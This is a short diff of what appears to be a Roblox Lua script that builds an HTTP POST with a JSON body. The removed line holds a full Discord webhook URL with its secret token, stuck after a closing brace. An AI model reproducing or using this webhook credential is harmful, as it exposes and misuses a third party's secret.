@@ -106,7 +106,7 @@ local a = {
 	Method = 'POST';
 	Headers = {
 		['Content-Type'] = 'application/json';
-	};https://discord.com/api/webhooks/1030914224769216554/TKAXL42atKaGyvrqZd16D3fA-VnRG2ziVMiBkuDtESggpwOMfsEzYOxq-WC-124IyhXp
+	};
 	Body = game:GetService'HttpService':JSONEncode({
 		content = Content;
 		embeds = {
